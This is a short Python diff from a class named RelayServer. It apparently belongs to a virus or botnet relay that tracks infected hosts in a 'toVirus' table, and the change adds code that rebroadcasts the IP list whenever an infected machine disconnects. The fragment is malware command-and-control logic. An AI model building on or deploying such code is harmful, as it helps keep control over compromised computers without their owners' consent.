@@ -75,7 +75,8 @@ class RelayServer:
             except socket.error as error:
                 if error.errno == errno.WSAECONNRESET:
                     del self.toVirus[address[0]]
-                    print address[0] + " uninfected!"
+                    self.sendIPList()
+                    print address[0] + " uninfected or turned computer off!"
                     break
                 else:
                     raise
